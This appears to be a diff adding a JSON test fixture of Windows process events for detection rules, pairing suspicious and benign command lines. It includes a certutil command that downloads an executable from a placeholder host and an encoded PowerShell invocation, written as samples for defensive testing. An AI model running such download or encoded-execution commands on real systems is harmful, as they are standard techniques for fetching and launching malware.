@@ -1,0 +1,52 @@
+{
+  "events": [
+    {
+      "name": "encoded-powershell",
+      "event": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -enc SQBFAFgA",
+        "User": "CONTOSO\\analyst"
+      }
+    },
+    {
+      "name": "plain-powershell",
+      "event": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe Get-Process",
+        "User": "CONTOSO\\analyst"
+      }
+    },
+    {
+      "name": "certutil-download",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://contoso.example/host.exe",
+        "User": "CONTOSO\\analyst"
+      }
+    },
+    {
+      "name": "certutil-local",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -dump cert.contoso.local",
+        "User": "CONTOSO\\analyst"
+      }
+    },
+    {
+      "name": "rundll32-native",
+      "event": {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL",
+        "User": "CONTOSO\\analyst"
+      }
+    },
+    {
+      "name": "rundll32-32bit",
+      "event": {
+        "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL",
+        "User": "CONTOSO\\analyst"
+      }
+    }
+  ]
+}
